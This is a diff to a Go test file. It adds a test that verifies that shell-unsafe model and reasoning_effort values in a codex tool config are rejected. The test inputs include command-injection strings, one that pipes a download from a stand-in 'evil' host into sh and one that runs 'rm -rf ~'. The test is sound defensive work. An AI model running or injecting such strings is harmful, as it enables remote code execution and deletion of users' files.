@@ -91,6 +91,29 @@ func TestGetConfiguredTool_CodexConfigDoesNotLeakIntoClaude(t *testing.T) {
 	}
 }
 
+// TestGetConfiguredTool_Codex_RejectsUnsafeFlagValues verifies the loud
+// failure path: [tool.codex] values that are not shell-safe tokens (the argv
+// is joined into a shell command string downstream, and the [tool] section is
+// mergeable from untrusted project config) must error at launch, not launch a
+// mangled or injected command.
+func TestGetConfiguredTool_Codex_RejectsUnsafeFlagValues(t *testing.T) {
+	for _, bad := range []string{"gpt 5-codex", "$(curl evil|sh)", "x;rm -rf ~"} {
+		cfg := config.GetDefaultConfig()
+		cfg.Tool.Name = "codex"
+		cfg.Tool.Codex.Model = bad
+		if _, err := getConfiguredTool(cfg); err == nil {
+			t.Errorf("getConfiguredTool with model %q must error, got nil", bad)
+		}
+
+		cfg = config.GetDefaultConfig()
+		cfg.Tool.Name = "codex"
+		cfg.Tool.Codex.ReasoningEffort = bad
+		if _, err := getConfiguredTool(cfg); err == nil {
+			t.Errorf("getConfiguredTool with reasoning_effort %q must error, got nil", bad)
+		}
+	}
+}
+
 // TestBuildCLICommand_Codex_NewSession verifies the full command string for a
 // fresh codex session in default (bypass) mode.
 func TestBuildCLICommand_Codex_NewSession(t *testing.T) {
